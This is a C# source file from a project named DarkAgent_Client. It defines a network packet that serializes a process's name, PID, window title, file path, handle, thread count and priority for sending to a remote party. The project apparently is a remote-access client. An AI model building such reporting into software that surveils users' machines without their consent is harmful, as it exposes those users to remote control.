using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using DarkAgent_Client.src.Objects;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Send
{
    class S_GetProcesses : SendBasePacket
    {

        ProcessInfo inf;
        public S_GetProcesses(ClientConnect client, ProcessInfo info)
            : base(client)
        {
            inf = info;
        }

        protected internal override void Write()
        {
            WriteByte(1);
            WriteString(inf.ProcessName);
            WriteInteger(inf.PID);
            WriteString(inf.WindowsTitle);
            WriteByte(inf.Responding);
            WriteString(inf.FileLocation);
            WriteInteger(inf.Handle);
            WriteInteger(inf.ProcessorAffinity);
            WriteInteger(inf.Threads);
            WriteByte(inf.Priority);
        }
    }
}